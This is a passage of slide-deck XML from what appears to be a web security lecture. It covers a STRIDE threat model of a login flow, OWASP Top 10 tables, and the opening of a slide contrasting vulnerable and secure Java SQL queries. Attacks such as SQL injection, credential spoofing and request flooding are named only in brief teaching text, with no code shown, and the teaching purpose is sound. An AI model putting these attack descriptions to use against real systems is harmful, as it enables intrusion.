                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3319272" y="2699766"/>
            <a:ext cx="2185416" cy="566928"/>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TLS-encrypted request travels to the server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="1920240"/>
            <a:ext cx="2331720" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3B57"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6016752" y="1920240"/>
            <a:ext cx="2185416" cy="85039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Auth Server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6016752" y="2699766"/>
            <a:ext cx="2185416" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D6E0EA"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Verifies credentials, issues a session</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8641080" y="1920240"/>
            <a:ext cx="2331720" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8714232" y="1920240"/>
            <a:ext cx="2185416" cy="850392"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>User DB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8714232" y="2699766"/>
            <a:ext cx="2185416" cy="566928"/>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Stores hashed passwords and account data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2880360" y="2628900"/>
            <a:ext cx="365760" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="AFC2D2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5577840" y="2628900"/>
            <a:ext cx="365760" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="AFC2D2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="2628900"/>
            <a:ext cx="365760" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="AFC2D2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3703320"/>
            <a:ext cx="3429000" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4348"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658368" y="3776472"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>S — Spoofing: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker submits stolen credentials, impersonating the user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4206240" y="3703320"/>
            <a:ext cx="3429000" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4348"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="3776472"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>T — Tampering: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker intercepts and modifies the request in transit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="3703320"/>
            <a:ext cx="3429000" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4348"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7973568" y="3776472"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>R — Repudiation: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No login is logged; user denies performing an action</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4937760"/>
            <a:ext cx="3429000" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4348"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658368" y="5010912"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>I — Info Disclosure: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Verbose error reveals whether an email exists in the DB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4206240" y="4937760"/>
            <a:ext cx="3429000" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4348"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="5010912"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>D — Denial of Service: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker floods the login endpoint with requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="4937760"/>
            <a:ext cx="3429000" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4348"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7973568" y="5010912"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>E — Elevation of Privilege: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SQL injection in the login query grants admin access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>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33" name="Text 31"/>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4.1 OWASP TOP 10</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The OWASP Top 10 — Ranks 1–5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1234440"/>
            <a:ext cx="11064240" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The industry-standard list of the most critical Web application security risks, maintained by the Open Worldwide Application Security Project.</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1005840"/>
                <a:gridCol w="2926080"/>
                <a:gridCol w="7132320"/>
              </a:tblGrid>
              <a:tr h="566928">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Risk</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In Plain Terms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A01</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Broken Access Control</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Users can act or view data outside their permissions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A02</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Cryptographic Failures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Sensitive data exposed due to weak or missing encryption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A03</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Injection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Untrusted input is executed as code (SQL, command, etc.)</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A04</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Insecure Design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The flaw is in the architecture, not just the implementation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A05</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Security Misconfiguration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Default settings, verbose errors, or unnecessary features left on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7"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4.1 OWASP TOP 10</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The OWASP Top 10 — Ranks 6–10</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005840"/>
                <a:gridCol w="3291840"/>
                <a:gridCol w="6766560"/>
              </a:tblGrid>
              <a:tr h="566928">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Risk</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In Plain Terms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A06</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Vulnerable Components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Using libraries or frameworks with known, unpatched flaws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A07</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Auth &amp; Identification Failures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Weak login, session, or password-reset mechanisms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A08</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Software &amp; Data Integrity Failures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Trusting unsigned updates, plugins, or CI/CD pipelines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A09</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Logging &amp; Monitoring Failures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Breaches go undetected because nothing is watching</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A10</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Server-Side Request Forgery (SSRF)</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Server is tricked into making requests to unintended targets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892040"/>
            <a:ext cx="11064240" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5161"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="5020056"/>
            <a:ext cx="10661904" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Today's Deep Dives</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="5394960"/>
            <a:ext cx="10661904" cy="77724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Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>We go deep on four items directly relevant to what you're building this semester: A03 (Injection), A07-related Cross-Site Scripting, A07 (Authentication failures), and CSRF (a classic attack tied to Week 2's cookie discussion).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>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9" name="Text 6"/>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A03 · INJECTION</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SQL Injection — Vulnerable vs. Secure Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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250" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The exact flaw from the login threat model (STRIDE: Elevation of Privilege) — string-concatenated SQL lets an attacker rewrite the query.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="5349240" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8E9E9"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="B23A3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1783080"/>
            <a:ext cx="5020056" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B23A3A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
